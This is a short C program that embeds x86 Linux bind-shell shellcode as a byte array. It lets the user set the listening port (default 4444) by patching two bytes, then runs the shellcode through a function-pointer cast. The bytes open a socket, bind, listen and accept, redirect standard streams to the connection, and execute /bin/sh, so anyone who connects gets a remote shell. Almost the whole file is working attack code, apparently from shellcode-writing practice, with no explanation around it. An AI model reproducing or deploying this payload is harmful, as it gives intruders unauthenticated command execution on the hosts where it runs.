#include <stdio.h>
#include <string.h>
 
unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
 
main(int argc, char *argv[])
{
 
  /* Default port at 28th and 29th byte index: \x11\x5c */
 
  // in case no port is provided the default would be used
  if (argc < 2) {
    printf("No port provided, 4444 (0x115c will be used)\n");
  } 
  else
  {
 
    int port = atoi(argv[1]);
    printf("Binding to %d (0x%x)\n", port, port);
 
    unsigned int p1 = (port >> 8) & 0xff;
    unsigned int p2 = port & 0xff;
    // printf("%x %x\n", p1, p2);
 
    shellcode[28] = (unsigned char){p1};
    shellcode[29] = (unsigned char){p2};
 
    // printf("%x %x", shellcode[28], shellcode[29]);
}
 
  int (*ret)() = (int(*)())shellcode;
 
  ret(); 
 
}
